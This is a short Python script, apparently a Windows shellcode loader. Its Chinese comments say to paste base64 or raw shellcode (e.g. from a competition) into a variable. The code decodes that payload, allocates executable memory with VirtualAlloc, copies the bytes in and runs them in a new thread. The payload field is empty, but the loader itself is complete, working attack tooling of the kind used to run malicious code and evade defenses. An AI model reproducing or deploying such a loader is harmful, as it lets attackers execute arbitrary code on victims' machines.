import base64
import ctypes
# d 这里是 shellcode 的base64，
# 如果是在比赛中为了快捷，可以直接把生成的 shellcode 加上 b"" 
# 直接赋值给shellcode 变量 就行，
# 如 buf=b“\xdd\xff\xff.........”
d=''
e = base64.b64decode(d)
shellcode = e
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)